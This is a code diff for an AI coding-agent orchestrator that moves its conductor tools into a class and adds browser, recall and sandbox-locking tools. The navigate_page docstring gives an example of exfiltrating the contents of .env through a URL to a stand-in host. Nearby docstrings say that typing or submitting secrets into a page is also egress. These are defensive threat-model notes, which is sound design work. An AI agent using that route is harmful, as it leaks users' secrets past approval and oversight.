@@ -53,6 +53,22 @@ from engine.default_prompts import (
     DESIGN_BRIEF_PROMPT,
     KNOWLEDGE_BRIEF_PROMPT,
 )
+from engine.recall import (
+    MAX_THREADS,
+    build_brief,
+    distill_observations,
+    format_recall,
+    format_thread_recall,
+    search as search_recall,
+    search_threads,
+)
+from engine.webview_bridge import (
+    BridgeUnavailable,
+    WebviewBridge,
+    format_action,
+    format_navigation,
+    format_page,
+)
 from engine.fs import FileSystemService, PathEscapeError
 from engine.git import GitService
 from engine.library import (
@@ -91,6 +107,17 @@ from engine.toolcall import ToolSpec
 if TYPE_CHECKING:
     from engine.services import SettingsService
     from engine.trace import TraceService
+
+#: What a page verb says when there is no page. One sentence, named, because a
+#: missing browser is the *normal* answer in a benchmark, a CLI turn and most
+#: of the suite — and a verb that raised there would fail every turn on every
+#: machine that is not the desktop app.
+_NO_BROWSER = (
+    "There is no browser attached to this engine, so there is no page to act "
+    "on. This is the normal answer outside the desktop app — a command-line "
+    "engine, a benchmark and a headless test all have no page. Ask the user "
+    "to open the page in Codify, or answer from the workspace."
+)
 
 
 class AgentOutputInvalid(Exception):
@@ -653,6 +680,13 @@ class AgentOrchestrator:
                     model=model,
                     temperature=temperature,
                     max_tokens=max_tokens,
+                    # The gate's num_ctx and keep_alive travel through GateCall's
+                    # caller — engine/laya.py reads the laya role's own config and
+                    # adds the keywords there; this closure has no cfg in scope,
+                    # and a getattr on a name that does not exist would be a lie
+                    # mypy could not catch.
+                    num_ctx=None,
+                    keep_alive=None,
                 )
             finally:
                 # The provider is shared across roles and reused for a replay, so
@@ -894,6 +928,8 @@ class AgentOrchestrator:
                     model=model_name,
                     temperature=target.temperature,
                     max_tokens=target.max_tokens,
+                    num_ctx=target.ollama_num_ctx,
+                    keep_alive=target.ollama_keep_alive,
                 )
             except ProviderError as exc:
                 flush_deltas()
@@ -985,6 +1021,611 @@ class _Conducted:
         return "it used every call it was given without producing a plan"
 
 
+class ConductorTools:
+    """The conductor's tools, each bound to the service the pipeline uses.
+
+    This table *is* the conductor's authority, and it is deliberately made
+    of the same calls the pipeline already makes — `LibraryService.read` is
+    what serves the librarian's reads, `SandboxService.run_command` is what
+    the verifier's argv goes through. So docs/00 §6.6 holds for a tool call
+    exactly as it holds for a verifier: the model asks, `validate_argv`
+    decides, and an unlisted command is refused however it was phrased.
+
+    What replaced `delegate`: the seven stage moves below. `delegate` ran
+    the whole recipe — librarian, design, planner — whether or not the
+    request needed it, which made the sequence a property of the code rather
+    than a decision of the decider. Each stage is now reachable on its own.
+
+    What did *not* change is who is allowed to do what. `write` is the
+    fixer's method under the fixer's validation and it refuses while the
+    goal is unapproved (docs/00 §6.9); `verify` is the verifier's, so the
+    command it proposes goes through `validate_argv` in `test` mode exactly
+    as a step's own verification does (docs/00 §6.6). The conductor chooses
+    *when* each runs. It cannot make any of them run without their checks.
+    """
+
+    #: Every name this table answers to, in the order the menu lists them. A tool
+    #: cannot be defined and left out of the menu, and a name here cannot be a tool
+    #: that does not exist — the table and the menu used to be two hand-maintained
+    #: literals inside one function.
+    NAMES: tuple[str, ...] = (
+        'read_file',
+        'search_code',
+        'git_history',
+        'run_command',
+        'read_page',
+        'navigate_page',
+        'click_page',
+        'type_page',
+        'recall',
+        'recall_threads',
+        'recon',
+        'design',
+        'plan',
+        'write',
+        'verify',
+        'review',
+        'summarize',
+        'use_skill',
+    )
+
+    def __init__(
+        self, service: ExecutorService, goal_id: str, goal: Goal, root: str, skills: SkillSet
+    ) -> None:
+        # A *named* method per tool, rather than a closure only
+        # `_conductor_dispatch` could reach: that is what lets one be tested on
+        # its own, and what makes the authority above readable in one place.
+        # `service` is the pipeline that owns every call a tool makes.
+        self.service = service
+        self.goal_id = goal_id
+        self.goal = goal
+        self.root = root
+        self.skills = skills
+        # Resolved once, here, rather than in every tool that needs one.
+        self.library = LibraryService(root)
+        self.git = service.git
+        self.ws = service.workspaces.get(goal.workspace_id)
+        # `state` is what one move hands to the next inside a single conductor
+        # run: the files a write produced, the verdict a verify returned. It is
+        # keyed by step so a conductor working through three steps cannot mix
+        # one step's diff into another's review.
+        self.state: dict[str, dict[str, Any]] = {}
+
+    def step_for(self, step_id: str) -> PlanStep | str:
+        """The step, or the sentence explaining which ids exist.
+
+        Returning the refusal rather than raising it is the same rule the
+        loop holds everywhere else: a model that passed a stale or invented
+        id gets something it can act on, not a dead turn.
+        """
+        steps = self.service.goals.steps(self.goal_id)
+        for candidate in steps:
+            if candidate.id == step_id:
+                return candidate
+        if not steps:
+            return (
+                "There is no step with that id, because this goal has no "
+                "steps yet. Call `plan` first (and `recon` before it if there "
+                "is no evidence)."
+            )
+        listed = ", ".join(f"{s.id} ({s.title!r})" for s in steps)
+        return f"There is no step called {step_id!r}. The steps are: {listed}"
+
+    async def use_skill(self, args: dict[str, Any]) -> str:
+        """One skill's instructions, or the menu if the name is wrong.
+
+        The body is returned as a tool result and nowhere else. It is never
+        executed or imported: a skill is text a model reads, so the worst a
+        hostile one in a cloned repository can do is argue, and an argument
+        cannot widen a tool.
+        """
+        name = str(args.get("name") or "").strip().lower()
+        found = self.skills.get(name)
+        if found is None:
+            return (
+                f"There is no skill called {name!r}. Available:\n{self.skills.menu()}"
+            )
+        self.service._log(self.goal_id, None, "info", f"conductor loaded the {found.name} skill")
+        return found.body
+
+    async def read_file(self, args: dict[str, Any]) -> str:
+        return format_read(
+            self.library.read(
+                str(args.get("path") or ""),
+                args.get("offset"),
+                args.get("limit"),
+            )
+        )
+
+    async def search_code(self, args: dict[str, Any]) -> str:
+        # A search walks the whole workspace and can spawn ripgrep, so it is
+        # off the event loop too — see `run_command` for why that matters.
+        result = await asyncio.to_thread(
+            self.library.search,
+            str(args.get("query") or ""),
+            glob=str(args["glob"]) if args.get("glob") else None,
+            regex=bool(args.get("regex")),
+            mode=str(args["mode"]) if args.get("mode") else None,
+        )
+        return format_search(result)
+
+    async def git_history(self, args: dict[str, Any]) -> str:
+        # `GitService.read_only` owns the subcommand allowlist. The
+        # conductor's authority is that list, and it lives with the service
+        # that runs git rather than in a table here that could drift from it.
+        # A thread, because git is a subprocess: a `log` over a long history
+        # used to hold the event loop behind it.
+        return await asyncio.to_thread(self.git.read_only, self.root, args.get("args") or [])
+
+    async def run_command(self, args: dict[str, Any]) -> str:
+        argv = args.get("argv") or []
+        if not isinstance(argv, list) or not all(isinstance(a, str) for a in argv):
+            return "run_command takes a list of strings, e.g. [\"pytest\", \"-q\"]"
+        reason = str(args.get("reason") or "").strip()
+        # `mode="test"`, the same mode the verifier's argv runs in. The
+        # conductor is not the librarian, so it gets the test allowlist
+        # rather than the read-only one — but it does not get a *wider* one.
+        #
+        # Off the event loop, and under the lock the verifier already takes.
+        # This runs a real process for up to two minutes and it used to run it
+        # *in* the loop: every WebSocket tick, /health probe and cancel request
+        # queued behind the command, so watching a long test made the app
+        # report itself offline. The lock is the other half of the same rule —
+        # the sandbox is one shared workspace, so a concurrent step's test must
+        # not run in the tree this command is measuring.
+        # `to_thread` re-raises in the awaiter, so a refusal still arrives as
+        # `CommandNotAllowed` — the behaviour this tool already had.
+        async with self.service._sandbox_lock:
+            result = await asyncio.to_thread(
+                self.service.sandbox.run_command, self.root, [str(a) for a in argv], mode="test",
+            )
+        return format_command(result) + (f"\n(reason given: {reason})" if reason else "")
+
+    async def read_page(self, args: dict[str, Any]) -> str:
+        """What the browser tab the user is looking at is showing.
+
+        Read-only and outward-facing in the one sense that matters: it
+        cannot navigate, cannot run anything and cannot reach the network
+        from here. The page it reads is whatever the user put there — the
+        model did not choose the URL and cannot change it — which is what
+        makes this safe to offer to a role that reasons about untrusted
+        text all day: the text arrives already labelled as a website's.
+
+        A missing bridge is the normal case in a benchmark, a CLI turn and
+        most of the test suite, so it is a sentence rather than an
+        exception. An engine that raised here would fail every turn on
+        every machine that is not the desktop app.
+        """
+        bridge = self.service.bridge
+        if bridge is None:
+            return (
+                "There is no browser attached to this engine, so there is "
+                "no page to read. This is the normal answer outside the "
+                "desktop app — a command-line engine, a benchmark and a "
+                "headless test have no page. Answer from the workspace, or "
+                "ask the user to paste what they are looking at."
+            )
+        tab = str(args.get("tab") or "").strip() or None
+        selector = str(args.get("selector") or "").strip() or None
+        self.service._log(
+            self.goal_id, None, "info",
+            f"conductor read the page in {tab or 'the active browser tab'}",
+        )
+        try:
+            page = await bridge.read_page(
+                tab=tab, selector=selector, max_chars=args.get("max_chars")
+            )
+        except BridgeUnavailable as exc:
+            return f"No page to read. {exc}"
+        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
+            return f"That page read did not come back. {exc}"
+        return format_page(page)
+
+    async def recall(self, args: dict[str, Any]) -> str:
+        """What this workspace has already learned the hard way.
+
+        Read-only, and pointed at this workspace's own outcome history
+        rather than at the web or at another project's rows. It cannot
+        change anything: `RecallService` has no write path at all, so
+        there is nothing here for a model to escalate into.
+
+        Scoped by `goal.workspace_id` rather than by anything the model
+        could influence. A user with two repositories open must not have
+        one's failures recalled into the other's turns, and doing the
+        filter in SQL rather than in Python means the other workspace's
+        rows are never even read to decide that.
+        """
+        query = str(args.get("query") or "").strip()
+        if not query:
+            return (
+                "recall needs something to look for — an error code, a "
+                "message fragment, a path or a stage name."
+            )
+        days = args.get("days")
+        rows = self.service.goals.recall_events(
+            self.goal.workspace_id,
+            window_days=int(days) if isinstance(days, int) else 0,
+        )
+        result = search_recall(rows, query, limit=int(args.get("limit") or 8))
+        self.service._log(
+            self.goal_id, None, "info",
+            f"conductor recalled {result.get('matched', 0)} past event(s) "
+            f"for {query[:120]!r}",
+        )
+        return format_recall(result)
+
+    async def recall_threads(self, args: dict[str, Any]) -> str:
+        """What earlier threads here were about, and how their runs ended.
+
+        The thread-grain sibling of `recall`: that reads events inside
+        runs, this reads the conversation history itself. Scoped by
+        `goal.workspace_id` in the same way, for the same reason — another
+        workspace's threads are never read to be discarded.
+        """
+        rows = self.service.goals.thread_recall(self.goal.workspace_id)
+        result = search_threads(rows, args.get("query"), limit=int(args.get("limit") or MAX_THREADS))
+        query = str(args.get("query") or "").strip()
+        self.service._log(
+            self.goal_id, None, "info",
+            f"conductor recalled {result.get('count', 0)} thread(s)"
+            + (f" matching {query[:120]!r}" if query else " (most recent)"),
+        )
+        return format_thread_recall(result)
+
+    async def navigate_page(self, args: dict[str, Any]) -> str:
+        """Move the user's tab somewhere the model picked.
+
+        The one tool here that changes something the user can see, so it is
+        worth being exact about where the authority is: the model proposes
+        a URL and this engine does not decide whether it is allowed. The
+        shell's `parse_navigation` does, in Rust, on the URL that arrives
+        there — and it is the *same function* the user's own clicks go
+        through, so a model-proposed address meets the guard rather than a
+        copy of it. The redirect that follows is guarded again by
+        `on_navigation`, exactly as it is for a person.
+
+        What this cannot do is escalate the model's *authority*: the
+        destination is another page in the same embedded webview, which
+        holds no capability and cannot reach the engine.
+
+        **What it does not prevent, and the guard above cannot.** The model
+        can put anything it has read into the address it proposes, and
+        `parse_navigation` admits any public http(s) URL — so
+        `navigate_page("https://elsewhere.example/?d=<contents of .env>")`
+        is a one-call way out of the machine for workspace contents, needing
+        no approval, and leaving nothing in the transcript but the address.
+        The guard decides *where* a navigation may go; nothing in this
+        engine can decide whether the address is being used to carry data
+        out, because the address is the payload. That is the thing to weigh
+        before widening what a conductor turn may read.
+        """
+        bridge = self.service.bridge
+        if bridge is None:
+            return (
+                "There is no browser attached to this engine, so there is "
+                "no tab to move. This is the normal answer outside the "
+                "desktop app. Give the user the address to open instead."
+            )
+        url = str(args.get("url") or "").strip()
+        tab = str(args.get("tab") or "").strip() or None
+        # Logged before the navigation, not after: this is the one tool
+        # whose effect the user sees, and the transcript line is the only
+        # place they will find out it happened.
+        self.service._log(
+            self.goal_id, None, "info",
+            f"conductor moved {tab or 'the active browser tab'} to {url[:200]}",
+        )
+        try:
+            moved = await bridge.navigate(url, tab=tab)
+        except BridgeUnavailable as exc:
+            return f"That navigation did not happen. {exc}"
+        except Exception as exc:  # noqa: BLE001 — the guard's verdict is not our bug
+            return f"That navigation did not happen. {exc}"
+        return format_navigation(moved)
+
+    async def click_page(self, args: dict[str, Any]) -> str:
+        """Click what a selector names on the page the user is looking at.
+
+        The second tool here that changes what someone can see, and the
+        authority is the same as the navigation's: the model picks the
+        element, the page performs the click, and every navigation that
+        follows is met by the shell's own `parse_navigation` and by
+        `on_navigation` — the same guard a person's own click goes
+        through. As with `navigate_page`, this moves authority nowhere; the
+        webview holds no capability and cannot reach the engine.
+
+        It is also the second half of `type_page`, and the half that sends:
+        a click on a submit control posts whatever a previous `type_page`
+        put in a field, and the address it posts to is the page's choice,
+        not this engine's. `type_page` alone was described as unable to
+        submit anything, which was true of this tool's absence and is not
+        true of the pair.
+        """
+        bridge = self.service.bridge
+        if bridge is None:
+            return _NO_BROWSER
+        selector = str(args.get("selector") or "").strip()
+        tab = str(args.get("tab") or "").strip() or None
+        self.service._log(
+            self.goal_id, None, "info",
+            f"conductor clicked {selector!r} in {tab or 'the active browser tab'}",
+        )
+        try:
+            done = await bridge.click(selector, tab=tab)
+        except BridgeUnavailable as exc:
+            return f"That click did not happen. {exc}"
+        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
+            return f"That click did not happen. {exc}"
+        return format_action(done, "click")
+
+    async def type_page(self, args: dict[str, Any]) -> str:
+        """Put text into a field on the page the user is looking at.
+
+        The narrowest of the four page verbs and the one with the most
+        room to do damage, because it is the only one that writes. It is
+        therefore also the one whose result says the least: the engine has
+        not submitted anything, and what it typed may not have gone
+        anywhere.
+
+        "May not" rather than "has not", because a page sends on its own
+        terms: a search box that queries on every keystroke is ordinary
+        web behaviour, and this tool cannot see it happen. So typing a
+        secret into a field a page watches is already an egress, and
+        `click_page` on a submit control is the same act in one call.
+        """
+        bridge = self.service.bridge
+        if bridge is None:
+            return _NO_BROWSER
+        selector = str(args.get("selector") or "").strip()
+        text = str(args.get("text") or "")
+        tab = str(args.get("tab") or "").strip() or None
+        self.service._log(
+            self.goal_id, None, "info",
+            f"conductor typed {len(text)} character(s) into {selector!r} in "
+            f"{tab or 'the active browser tab'}",
+        )
+        try:
+            done = await bridge.type_text(selector, text, tab=tab)
+        except BridgeUnavailable as exc:
+            return f"That text was not typed. {exc}"
+        except Exception as exc:  # noqa: BLE001 — a page's behaviour is not our bug
+            return f"That text was not typed. {exc}"
+        return format_action(done, "type")
+
+        # ── the stage moves ────────────────────────────────────────────────
+    async def recon(self, args: dict[str, Any]) -> str:
+        task = str(args.get("task") or "").strip()
+        if not task:
+            return "recon needs a task saying what to find out."
+        self.service._log(self.goal_id, None, "info", f"conductor sent the librarian: {task}")
+        try:
+            async with self.service._stage(self.goal_id, "librarian", "librarian") as lib_stage:
+                evidence = await self.service._librarian(self.goal_id, self.goal, self.ws, task=task)
+                lib_stage.record("incomplete" if evidence.get("capped") else "pack")
+        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
+            return (
+                f"The librarian could not run ({getattr(exc, 'code', 'error')}: "
+                f"{exc}). You may plan without evidence, but say in your answer "
+                "that the workspace was not looked at."
+            )
+        return self.service._evidence_text(evidence)
+
+    async def design(self, args: dict[str, Any]) -> str:
+        task = str(args.get("task") or "").strip()
+        if not task:
+            return "design needs a task saying what direction to lock."
+        evidence = self.service._evidence_for(self.goal_id)
+        if not evidence:
+            return (
+                "There is no evidence for the designer to decide from. Call "
+                "`recon` first, then `design`."
+            )
+        try:
+            async with self.service._stage(self.goal_id, "design", "design") as design_stage:
+                locked = await self.service._design(self.goal_id, self.goal, self.ws, evidence, task=task)
+                design_stage.record("contract" if locked else "declined")
+        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
+            return (
+                f"The designer could not run ({getattr(exc, 'code', 'error')}: "
+                f"{exc}). Plan without a locked direction, and say so."
+            )
+        if not locked:
+            return "The designer declined to lock a direction for this request."
+        return self.service._design_text(locked)
+
+    async def plan(self, args: dict[str, Any]) -> str:
+        task = str(args.get("task") or "").strip()
+        evidence = self.service._evidence_for(self.goal_id)
+        if not evidence:
+            # The one guard that has to stay in code rather than in the
+            # prompt: a plan written against a guessed file layout edits the
+            # wrong files, and telling a model to recon first does not stop a
+            # model that has decided it already knows.
+            return (
+                "There is no evidence yet, and a plan built on a guess edits "
+                "the wrong files. Call `recon` first, then call `plan` again."
+            )
+        try:
+            await self.service._plan_steps(
+                self.goal_id, self.goal, self.ws, evidence, self.service._design_for(self.goal_id),
+                task=task or None,
+            )
+        except (AgentOutputInvalid, ProviderError, ValueError) as exc:
+            return (
+                f"Planning failed ({getattr(exc, 'code', 'error')}: {exc}). "
+                "Nothing was written and the goal is not planned."
+            )
+        refreshed = self.service.goals.get(self.goal_id)
+        steps = self.service.goals.steps(self.goal_id)
+        return json.dumps({
+            "status": refreshed.status,
+            "steps": [
+                {"step_id": s.id, "title": s.title, "order": s.ordinal}
+                for s in steps
+            ],
+            "note": (
+                "The plan is waiting for the user to approve it. Nothing has "
+                "been written and nothing can be until they start it. Tell "
+                "them what the steps are and stop."
+            ),
+        }, default=str)
+
+    async def write(self, args: dict[str, Any]) -> str:
+        step_id = str(args.get("step_id") or "").strip()
+        instructions = str(args.get("instructions") or "").strip()
+        step = self.step_for(step_id)
+        if isinstance(step, str):
+            return step
+        allowed, why = self.service._write_allowed(self.goal_id)
+        if not allowed:
+            return why
+        if not instructions:
+            return "write needs instructions: what should change."
+        fs = FileSystemService(self.ws.root_path)
+        try:
+            async with self.service._stage(self.goal_id, "fixer", "fixer", step.id) as fix_stage:
+                summaries, _wants_pass = await self.service._fixer(
+                    self.goal_id, step, fs, self.goal.dry_run, self.service._evidence_for(self.goal_id),
+                    guidance=instructions,
+                )
+                changed = [s for s in summaries if s.get("changed", True)]
+                fix_stage.record("wrote" if changed else "no_change")
+        except (AgentOutputInvalid, ProviderError, PathEscapeError) as exc:
+            return (
+                f"The fixer failed on that step ({getattr(exc, 'code', 'error')}: "
+                f"{exc}). Nothing further was written for it."
+            )
+        self.state.setdefault(step.id, {})["files"] = summaries
+        return json.dumps({
+            "step_id": step.id,
+            "changed": [
+                {"path": s.get("path"), "op": s.get("op", "write")}
+                for s in summaries if s.get("changed", True)
+            ],
+            "dry_run": bool(self.goal.dry_run),
+            "note": (
+                "This was a dry run: the files were proposed, not written. "
+                if self.goal.dry_run else
+                "Call `verify` next: a change that has not been run is one "
+                "nobody has seen work."
+            ),
+        }, default=str)
+
+    async def verify(self, args: dict[str, Any]) -> str:
+        step_id = str(args.get("step_id") or "").strip()
+        step = self.step_for(step_id)
+        if isinstance(step, str):
+            return step
+        summaries = self.state.get(step.id, {}).get("files")
+        if summaries is None:
+            return (
+                "Nothing has been written for that step in this run. Call "
+                "`write` first — verification is meant to judge a change, "
+                "and there is none."
+            )
+        try:
+            async with self.service._stage(self.goal_id, "verifier", "verifier", step.id) as v:
+                outcome = await self.service._verifier(
+                    self.goal_id, step, self.ws, self.service._evidence_for(self.goal_id), diffs=summaries,
+                )
+                v.record(_verifier_outcome(outcome))
+        except TestsFailed as exc:
+            # The verifier's own contract: a failed run is the verdict, and
+            # it raises it as control flow inside `run_step`. Here it is a
+            # value, because the conductor is the thing that decides what to
+            # do about a failure — retry, re-plan, or report it.
+            outcome = self.service._last_test_result(self.goal_id, step.id)
+            self.state.setdefault(step.id, {})["test"] = outcome
+            return "Verification FAILED. " + json.dumps({
+                "reason": str(exc), "outcome": outcome,
+            }, default=str)
+        except (AgentOutputInvalid, ProviderError) as exc:
+            return (
+                f"The verifier could not run ({getattr(exc, 'code', 'error')}: "
+                f"{exc}). This step is unverified."
+            )
+        self.state.setdefault(step.id, {})["test"] = outcome
+        return json.dumps({"passed": True, "outcome": outcome}, default=str)
+
+    async def review(self, args: dict[str, Any]) -> str:
+        step_id = str(args.get("step_id") or "").strip()
+        step = self.step_for(step_id)
+        if isinstance(step, str):
+            return step
+        summaries = self.state.get(step.id, {}).get("files")
+        if summaries is None:
+            return (
+                "There is nothing to review for that step: it has not been "
+                "written in this run. Call `write` first."
+            )
+        outcome = self.state.get(step.id, {}).get("test") or self.service._last_test_result(
+            self.goal_id, step.id
+        )
+        if not outcome:
+            return (
+                "That step has no test verdict yet, and a review without one "
+                "cannot tell working code from broken code. Call `verify` first."
+            )
+        fs = FileSystemService(self.ws.root_path)
+        try:
+            async with self.service._stage(self.goal_id, "critic", "critic", step.id) as c:
+                await self.service._critic(
+                    self.goal_id, step, fs, summaries, self.service._evidence_for(self.goal_id),
+                    outcome, ws_root=self.ws.root_path,
+                )
+                c.record("approve")
+        except CriticRejection as exc:
+            # Recorded here because the stage block above never reaches its
+            # `record` on this path, and a critic that asked for changes is
+            # the one outcome a reader most needs to see.
+            self.service.goals.publish(self.service._event(
+                self.goal_id, step.id, "stage_result",
+                {
+                    "stage": "critic", "role": "critic", "ordinal": 0,
+                    "outcome": "request_changes", "detail": str(exc),
+                    "duration_ms": 0, "tokens": 0, "calls": 0,
+                },
+            ))
+            return (
+                "The critic asked for changes and did not approve: " + str(exc)
+                + "\nEither act on those reasons with `write`, or tell the user "
+                "plainly that you are not going to and why."
+            )
+        self.state.setdefault(step.id, {})["reviewed"] = True
+        return "The critic approved this step. Call `summarize` to record and commit it."
+
+    async def summarize(self, args: dict[str, Any]) -> str:
+        step_id = str(args.get("step_id") or "").strip()
+        step = self.step_for(step_id)
+        if isinstance(step, str):
+            return step
+        summaries = self.state.get(step.id, {}).get("files")
+        if summaries is None:
+            return "That step was not written in this run, so there is nothing to record."
+        if not self.state.get(step.id, {}).get("reviewed"):
+            # Not a formality. The commit is the point of no return for a
+            # step, and the review is the only thing standing between a
+            # model's opinion of its own work and the user's git history.
+            return (
+                "That step has not been reviewed. Call `review` first, and "
+                "commit it only if the critic approved."
+            )
+        outcome = self.state.get(step.id, {}).get("test") or self.service._last_test_result(
+            self.goal_id, step.id
+        )
+        try:
+            async with self.service._stage(self.goal_id, "scribe", "scribe", step.id) as s:
+                s.record(
+                    await self.service._scribe(
+                        self.goal_id, step, summaries, self.ws.root_path, self.goal.dry_run, outcome,
+                    )
+                )
+        except (AgentOutputInvalid, ProviderError) as exc:
+            return f"The scribe could not record that step ({exc})."
+        self.service._set_step(self.goal_id, step, "COMPLETED")
+        return "That step is recorded and committed."
+
+
 class ExecutorService:
     def __init__(
         self,
@@ -995,6 +1636,7 @@ class ExecutorService:
         git: GitService | None = None,
         laya: LayaService | None = None,
         tracer: TraceService | None = None,
+        bridge: WebviewBridge | None = None,
     ):
         self.goals = goals
         self.workspaces = workspaces
@@ -1004,6 +1646,11 @@ class ExecutorService:
         # System-1 pre-flight gate (see engine/laya.py). Optional by design: a
         # gate that cannot run is a skipped gate, never a broken pipeline.
         self.laya = laya or LayaService(registry=registry)
+        # The bridge to the shell's browser webviews (engine/webview_bridge.py).
+        # Optional for the same reason the gate is: an engine with no desktop
+        # shell behind it has no page, and `read_page` says so in a sentence
+        # rather than failing the turn.
+        self.bridge: WebviewBridge | None = bridge
         # Shared-resource locks for parallel goals. asyncio.Lock() is loop-lazy
         # (binds on first acquire), so constructing here — before any loop
         # exists — is safe.
@@ -1384,7 +2031,7 @@ class ExecutorService:
                         )
                     consults_left -= 1
                     ws_root = ws.root_path
-                    served, _opened, _matched, refused = self._serve_library_requests(
+                    served, _opened, _matched, refused = await self._serve_library_requests(
                         goal_id, LibraryService(ws_root),
                         self._library_requests(consult),
                     )
@@ -1646,358 +2293,19 @@ class ExecutorService:
     def _conductor_dispatch(
         self, goal_id: str, goal: Goal, root: str, skills: SkillSet
     ) -> dict[str, Any]:
-        """The conductor's tools, each bound to the service the pipeline uses.
+        """One conductor run's tool table, bound to this service.
 
-        This table *is* the conductor's authority, and it is deliberately made
-        of the same calls the pipeline already makes — `LibraryService.read` is
-        what serves the librarian's reads, `SandboxService.run_command` is what
-        the verifier's argv goes through. So docs/00 §6.6 holds for a tool call
-        exactly as it holds for a verifier: the model asks, `validate_argv`
-        decides, and an unlisted command is refused however it was phrased.
-
-        What replaced `delegate`: the seven stage moves below. `delegate` ran
-        the whole recipe — librarian, design, planner — whether or not the
-        request needed it, which made the sequence a property of the code rather
-        than a decision of the decider. Each stage is now reachable on its own.
-
-        What did *not* change is who is allowed to do what. `write` is the
-        fixer's method under the fixer's validation and it refuses while the
-        goal is unapproved (docs/00 §6.9); `verify` is the verifier's, so the
-        command it proposes goes through `validate_argv` in `test` mode exactly
-        as a step's own verification does (docs/00 §6.6). The conductor chooses
-        *when* each runs. It cannot make any of them run without their checks.
+        The tools themselves — and the authority each one does and does not
+        carry — live on `ConductorTools`, one named method each, so a single
+        tool can be tested without standing the whole table up. This method is
+        only the binding, and it is rebuilt per run on purpose: `state`, which is
+        what one move hands the next inside a run, must not survive into the
+        next turn, and a tool cannot be defined without appearing in the menu,
+        because the menu *is* `ConductorTools.NAMES`.
         """
-        library = LibraryService(root)
-        git = self.git
-        ws = self.workspaces.get(goal.workspace_id)
+        tools = ConductorTools(self, goal_id, goal, root, skills)
+        return {name: getattr(tools, name) for name in ConductorTools.NAMES}
 
-        async def use_skill(args: dict[str, Any]) -> str:
-            """One skill's instructions, or the menu if the name is wrong.
-
-            The body is returned as a tool result and nowhere else. It is never
-            executed or imported: a skill is text a model reads, so the worst a
-            hostile one in a cloned repository can do is argue, and an argument
-            cannot widen a tool.
-            """
-            name = str(args.get("name") or "").strip().lower()
-            found = skills.get(name)
-            if found is None:
-                return (
-                    f"There is no skill called {name!r}. Available:\n{skills.menu()}"
-                )
-            self._log(goal_id, None, "info", f"conductor loaded the {found.name} skill")
-            return found.body
-
-        async def read_file(args: dict[str, Any]) -> str:
-            return format_read(
-                library.read(
-                    str(args.get("path") or ""),
-                    args.get("offset"),
-                    args.get("limit"),
-                )
-            )
-
-        async def search_code(args: dict[str, Any]) -> str:
-            return format_search(
-                library.search(
-                    str(args.get("query") or ""),
-                    glob=str(args["glob"]) if args.get("glob") else None,
-                    regex=bool(args.get("regex")),
-                )
-            )
-
-        async def git_history(args: dict[str, Any]) -> str:
-            # `GitService.read_only` owns the subcommand allowlist. The
-            # conductor's authority is that list, and it lives with the service
-            # that runs git rather than in a table here that could drift from it.
-            return git.read_only(root, args.get("args") or [])
-
-        async def run_command(args: dict[str, Any]) -> str:
-            argv = args.get("argv") or []
-            if not isinstance(argv, list) or not all(isinstance(a, str) for a in argv):
-                return "run_command takes a list of strings, e.g. [\"pytest\", \"-q\"]"
-            reason = str(args.get("reason") or "").strip()
-            # `mode="test"`, the same mode the verifier's argv runs in. The
-            # conductor is not the librarian, so it gets the test allowlist
-            # rather than the read-only one — but it does not get a *wider* one.
-            return format_command(
-                self.sandbox.run_command(root, [str(a) for a in argv], mode="test")
-            ) + (f"\n(reason given: {reason})" if reason else "")
-
-        # ── the stage moves ────────────────────────────────────────────────
-        #
-        # `state` is what one move hands to the next inside a single conductor
-        # run: the files a write produced, the verdict a verify returned. It is
-        # keyed by step so a conductor working through three steps cannot mix
-        # one step's diff into another's review.
-        state: dict[str, dict[str, Any]] = {}
-
-        def step_for(step_id: str) -> PlanStep | str:
-            """The step, or the sentence explaining which ids exist.
-
-            Returning the refusal rather than raising it is the same rule the
-            loop holds everywhere else: a model that passed a stale or invented
-            id gets something it can act on, not a dead turn.
-            """
-            steps = self.goals.steps(goal_id)
-            for candidate in steps:
-                if candidate.id == step_id:
-                    return candidate
-            if not steps:
-                return (
-                    "There is no step with that id, because this goal has no "
-                    "steps yet. Call `plan` first (and `recon` before it if there "
-                    "is no evidence)."
-                )
-            listed = ", ".join(f"{s.id} ({s.title!r})" for s in steps)
-            return f"There is no step called {step_id!r}. The steps are: {listed}"
-
-        async def recon(args: dict[str, Any]) -> str:
-            task = str(args.get("task") or "").strip()
-            if not task:
-                return "recon needs a task saying what to find out."
-            self._log(goal_id, None, "info", f"conductor sent the librarian: {task}")
-            try:
-                async with self._stage(goal_id, "librarian", "librarian") as lib_stage:
-                    evidence = await self._librarian(goal_id, goal, ws)
-                    lib_stage.record("incomplete" if evidence.get("capped") else "pack")
-            except (AgentOutputInvalid, ProviderError, ValueError) as exc:
-                return (
-                    f"The librarian could not run ({getattr(exc, 'code', 'error')}: "
-                    f"{exc}). You may plan without evidence, but say in your answer "
-                    "that the workspace was not looked at."
-                )
-            return self._evidence_text(evidence)
-
-        async def design(args: dict[str, Any]) -> str:
-            task = str(args.get("task") or "").strip()
-            if not task:
-                return "design needs a task saying what direction to lock."
-            evidence = self._evidence_for(goal_id)
-            if not evidence:
-                return (
-                    "There is no evidence for the designer to decide from. Call "
-                    "`recon` first, then `design`."
-                )
-            try:
-                async with self._stage(goal_id, "design", "design") as design_stage:
-                    locked = await self._design(goal_id, goal, ws, evidence)
-                    design_stage.record("contract" if locked else "declined")
-            except (AgentOutputInvalid, ProviderError, ValueError) as exc:
-                return (
-                    f"The designer could not run ({getattr(exc, 'code', 'error')}: "
-                    f"{exc}). Plan without a locked direction, and say so."
-                )
-            if not locked:
-                return "The designer declined to lock a direction for this request."
-            return self._design_text(locked)
-
-        async def plan(args: dict[str, Any]) -> str:
-            task = str(args.get("task") or "").strip()
-            evidence = self._evidence_for(goal_id)
-            if not evidence:
-                # The one guard that has to stay in code rather than in the
-                # prompt: a plan written against a guessed file layout edits the
-                # wrong files, and telling a model to recon first does not stop a
-                # model that has decided it already knows.
-                return (
-                    "There is no evidence yet, and a plan built on a guess edits "
-                    "the wrong files. Call `recon` first, then call `plan` again."
-                )
-            try:
-                await self._plan_steps(
-                    goal_id, goal, ws, evidence, self._design_for(goal_id),
-                    task=task or None,
-                )
-            except (AgentOutputInvalid, ProviderError, ValueError) as exc:
-                return (
-                    f"Planning failed ({getattr(exc, 'code', 'error')}: {exc}). "
-                    "Nothing was written and the goal is not planned."
-                )
-            refreshed = self.goals.get(goal_id)
